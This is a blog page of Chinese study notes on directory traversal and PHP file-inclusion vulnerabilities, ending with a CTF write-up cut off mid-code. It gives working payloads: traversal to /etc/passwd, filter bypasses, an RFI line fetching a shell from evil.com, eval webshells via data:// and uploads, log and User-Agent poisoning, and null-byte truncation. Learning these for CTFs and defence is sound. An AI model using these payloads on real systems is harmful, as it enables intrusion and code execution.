@@ -1,0 +1,722 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="原理很简单的漏洞吧，主要就是各种绕过+组合  目录穿越eg:https:&#x2F;&#x2F;www.*****.com&#x2F;loadImage?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdfilename的参数值与真实路径组合起来就是：&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd其等价于：&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="目录穿越&amp;文件包含漏洞">
+<meta property="og:url" content="http://example.com/2021/11/19/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A&%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="原理很简单的漏洞吧，主要就是各种绕过+组合  目录穿越eg:https:&#x2F;&#x2F;www.*****.com&#x2F;loadImage?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdfilename的参数值与真实路径组合起来就是：&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd其等价于：&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/note/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png">
+<meta property="article:published_time" content="2021-11-19T07:04:44.000Z">
+<meta property="article:modified_time" content="2022-07-24T06:58:56.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/note/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png">
+  
+  
+  
+  <title>目录穿越&amp;文件包含漏洞 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="目录穿越&amp;文件包含漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-11-19 15:04" pubdate>
+          November 19, 2021 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">目录穿越&amp;文件包含漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>原理很简单的漏洞吧，主要就是各种绕过+组合</p>
+<!-- about -->
+<h1 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h1><p>eg:<br><a target="_blank" rel="noopener" href="https://www.*****.com/loadImage?filename=../../../etc/passwd">https://www.*****.com/loadImage?filename=../../../etc/passwd</a><br>filename的参数值与真实路径组合起来就是：<br>&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>其等价于：<br>&#x2F;etc&#x2F;passwd<br>..&#x2F;：上一级目录；.&#x2F;：当前目录；&#x2F;：根目录</p>
+<h2 id="可能出现的情况"><a href="#可能出现的情况" class="headerlink" title="可能出现的情况"></a>可能出现的情况</h2><p>比如前端是这么写的: </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/loadImage?filename=214.png&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><h3 id="绝对路径绕过"><a href="#绝对路径绕过" class="headerlink" title="绝对路径绕过"></a>绝对路径绕过</h3><p>web网站有时候会采取目录遍历的防御措施，如过滤 ..&#x2F; 上一级等关键字，可以试试绝对路径绕过，无须..&#x2F;返回上一级目录遍历：filename&#x3D;&#x2F;etc&#x2F;passwd<br>至于&#x2F;etc&#x2F;passwd，是linux常见目录…</p>
+<h3 id="双写-绕过"><a href="#双写-绕过" class="headerlink" title="双写..&#x2F;绕过"></a>双写..&#x2F;绕过</h3><p>若防御措施是把关键词替换为空(我觉得这种概率很小)，可以采用双写绕过</p>
+<h3 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h3><p>.   &#x3D;&gt;  %2e<br>&#x2F;   &#x3D;&gt;  %2f<br>% &#x3D;&gt; %25  (双重URL编码)</p>
+<h3 id="nginx绕过"><a href="#nginx绕过" class="headerlink" title="nginx绕过"></a>nginx绕过</h3><p>参考链接: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42586723/article/details/122944781">https://blog.csdn.net/weixin_42586723&#x2F;article&#x2F;details&#x2F;122944781</a><br>大概: Nginx在nginx.conf文件配置别名(Alias)的时候，如果忘记加&#x2F;，将造成一个目录穿越漏洞<br>eg: </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/files../</span><br></code></pre></td></tr></table></figure>
+<p>原理: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /files &#123;<br>    autoindex on;<br>    <span class="hljs-built_in">alias</span> /home/;<br>&#125;<br>会造成目录穿越，应把/files改成/fiels/<br>(我有个问题昂，就是如果改成/files/，那我payload就8能换成https://example.com/files/../ 吗)<br></code></pre></td></tr></table></figure>
+<h3 id="UNC绕过"><a href="#UNC绕过" class="headerlink" title="UNC绕过"></a>UNC绕过</h3><p>payload: </p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\\localhost\c$\windows\win.ini<br></code></pre></td></tr></table></figure>
+<p>UNC(Universal Naming Convention): 通用命名规则<br>C:\WINDOWS\Win.ini: 该文件为重要的系统文件。默认保存在C:\Windows\win.ini(相同目录下还有system.ini)，里面的内容大概长这样:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; for 16-bit app support</span><br><span class="hljs-section">[fonts]</span><br><span class="hljs-section">[extensions]</span><br><span class="hljs-section">[mci extensions]</span><br><span class="hljs-section">[files]</span><br><span class="hljs-section">[Mail]</span><br><span class="hljs-attr">MAPI</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>由于语言特性，该漏洞在php里居多，在jsp、asp里很少，所以主要讨论php里的<br>举个常见的文件包含漏洞的形式: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;inc/&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>通过这个漏洞，可以执行或显示php代码，为此可以与文件上传、文件写入等漏洞配合</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>PHP中的文件包含分为本地文件包含和远程文件包含</p>
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>本地文件包含 Local File Include (LFI)<br>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。<br>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p>
+<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>远程文件包含 Remote File Include (RFI)<br>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include&#x3D;off），开启远程包含功能需要在php.ini配置文件中修改。<br>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，但是一般遇8到…</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">如果支持远程文件包含，那么直接<span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9999</span>/index.php?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://evil.com/<span class="hljs-built_in">shell</span>.php 即可<span class="hljs-built_in">get</span> <span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure>
+<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>4个<br>include：找不到被包含的文件时只会产生警告，脚本将继续执行。<br>include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require：找不到被包含的文件时会产生致命错误，并停止脚本。<br>require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
+<h2 id="使用php封装协议读取"><a href="#使用php封装协议读取" class="headerlink" title="使用php封装协议读取"></a>使用php封装协议读取</h2><p>正常情况下，包含php文件只会执行其中的代码，但如果我们想获取到php文件的源码，如config.php，那么我们可以通过封装协议php:&#x2F;&#x2F;filter来读取<br><a target="_blank" rel="noopener" href="http://localhost/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png">http://localhost/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png</a></p>
+<p>php:&#x2F;&#x2F;input<br>利用条件: 需要开启allow_url_include&#x3D;on，对allow_url_fopen不做要求<br>大概就是Get传参时写?file&#x3D;php:&#x2F;&#x2F;input<br>然后用Post传参(或者直接改包)，像这样:<br><img src="/images/note/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png" srcset="/img/loading.gif" lazyload></p>
+<p>data伪协议读取文件，要求 allow_url_include&#x3D;On: </p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain;base64,c2gxdC5waHA=</span><br><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="LFI-文件上传getshell"><a href="#LFI-文件上传getshell" class="headerlink" title="LFI+文件上传getshell"></a>LFI+文件上传getshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">先文件上传<span class="hljs-number">1</span>个木马如: <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>然后进行利用: <br>http:<span class="hljs-comment">//localhost/index.php?file=shell.png&amp;shell=phpinfo();</span><br>这里我有个问题: 既然都上传了，那为啥不直接用蚁剑连呢? <br></code></pre></td></tr></table></figure>
+<h2 id="LFI-日志注入getshell"><a href="#LFI-日志注入getshell" class="headerlink" title="LFI+日志注入getshell"></a>LFI+日志注入getshell</h2><p>日志文件往往会包含我们的请求记录，如果我们知道日志的文件位置，就可以将恶意的php代码写入到日志中，然后再通过文件包含漏洞执行相关的代码</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">实际操作起来简单的8可思议，比如访问 http://localhost/index.php?file=shell.png&amp;test=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> </span><br><span class="language-xml">然后它就会被记录到日志文件，然后我们只要包含这个日志文件，就可以执行代码了.....(8会出现语法错误什么的吗...)</span><br></code></pre></td></tr></table></figure>
+
+<p>日志默认路径:<br>tomcat: &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;logs&#x2F;localhost_access_log.2020-09-21.txt<br>apache+linux: &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log<br>nginx: &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;access.log</p>
+<h2 id="LFI-proc-self-environ-getshell"><a href="#LFI-proc-self-environ-getshell" class="headerlink" title="LFI+&#x2F;proc&#x2F;self&#x2F;environ getshell"></a>LFI+&#x2F;proc&#x2F;self&#x2F;environ getshell</h2><p>在linux中，如果php以cgi方式运行(啥是cgi捏，建议学好网络通信基础)，那么&#x2F;proc&#x2F;self&#x2F;environ目录中会包含请求头中的UA(User-Agent)信息，那么这个User-Agent自然可以是木马啦，然后就能getshell了(我次奥，这么随意的吗)<br>具体操作: 抓包，改包:<br>GET lfi.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ HTTP&#x2F;1.1<br>User-Agent: <?php phpinfo();?><br>比如上述信息在发送后就可以显示phpinfo，次奥….</p>
+<h2 id="LFI-Session-getshell"><a href="#LFI-Session-getshell" class="headerlink" title="LFI+Session getshell"></a>LFI+Session getshell</h2><p>首先，通过phpinfo()可以知道session的目录<br>如果没法phpinfo也可以猜一猜…<br>常见session存放目录:<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p>
+<p>向session传入恶意代码的方式有这些:<br>.<br>.<br>.<br>有个P! 还得是php源码里写了类似下面的东西，session才能被你控制，可谓是非常的鸡肋…..</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$cmdback</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmdback&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;hack&quot;</span>]=<span class="hljs-variable">$cmdback</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="后缀限制-截断绕过"><a href="#后缀限制-截断绕过" class="headerlink" title="后缀限制-截断绕过"></a>后缀限制-截断绕过</h2><h3 id="常规截断"><a href="#常规截断" class="headerlink" title="常规截断"></a>常规截断</h3><p>要求:<br>php版本小于5.3.4<br>magic_quotes_gpc为off状态</p>
+<p>若限制了后缀名，则需要通过截断访问: index.php?file&#x3D;..&#x2F;..&#x2F;flag.php%00<br>%00 会被解析为0x00，导致截断的发生</p>
+<h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>文件路径是有最大长度限制的，为此可以通过填充垃圾字符来截断最后一部分<br>比如magic_quotes_gpc为on状态时，会把%00前加\转义掉: flag.php\0<br>条件:<br>php版本小于5.3.4</p>
+<p>windows 259个bytes<br>linux 4096个bytes</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">比如win下: <br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag.php..............................................................................................................................................................................................................................................<br>或者: <br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag.php.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./<br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag1.php<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span><br>(文件长度偶数时用<span class="hljs-number">2</span>，奇数时用<span class="hljs-number">3</span>，自己慢慢悟吧...)<br></code></pre></td></tr></table></figure>
+<p>使用截断的时候根据具体情况使用不同截断方法，遇到奇偶问题的时候可以丢一串很长的.&#x2F;到URL后面然后再调整第一个字符。一般来说%00就足够了，当%00不行时再尝试.&#x2F;的组合</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="include-ACTF2020"><a href="#include-ACTF2020" class="headerlink" title="include ACTF2020"></a>include ACTF2020</h3><p>进入页面发现只有一个按钮，点击后发现是这样传播: <a target="_blank" rel="noopener" href="http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php">http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php</a></p>
+<p>于是联想到文件包含漏洞，构造: &#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>有回显，base64转码得index.php源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">&quot;utf8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;php://input&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;zip://&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;phar://&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data:&quot;</span>))&#123;<br>	<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);  <span class="hljs-comment">// stristr: 